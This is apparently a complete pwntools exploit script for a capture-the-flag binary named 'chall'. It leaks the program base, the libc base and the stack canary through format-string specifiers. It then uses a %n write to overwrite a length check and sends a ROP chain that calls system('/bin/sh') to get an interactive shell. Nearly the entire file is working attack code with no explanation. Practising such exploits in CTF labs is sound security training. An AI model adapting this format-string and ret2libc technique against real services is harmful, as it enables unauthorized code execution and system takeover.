from pwn import *
from icecream import ic

# Set up pwntools for the correct architecture
exe = "./chall"
libc = ELF("libc.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("172.17.0.1", 5000)
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* fun+169
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def write(pay):
    ru(b"still your name ?\n")
    sl(pay)



r = start()

# Get leaks
ru(b"How long is your name: ")
sl(b"10")
sl(b"%11$p")
elf.address = int(rl().strip(), 16) - 0x1334
write(b"%19$p")
libc.address = int(rl().strip(), 16) - 0x29d90
write(b"%9$p")
canary = int(rl().strip(), 16)

ic(hex(elf.address))
ic(hex(libc.address))
ic(hex(canary))

# Overwrite len variable
write(f"%99c%12$n".encode())

write(b"A"*10 + p64(canary) + p64(0) + p64(libc.address + 0x0000000000029139) + p64(libc.address + 0x000000000002a3e5) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym.system))
write(f"%12$n".encode())

sl(b"1000")

r.interactive()
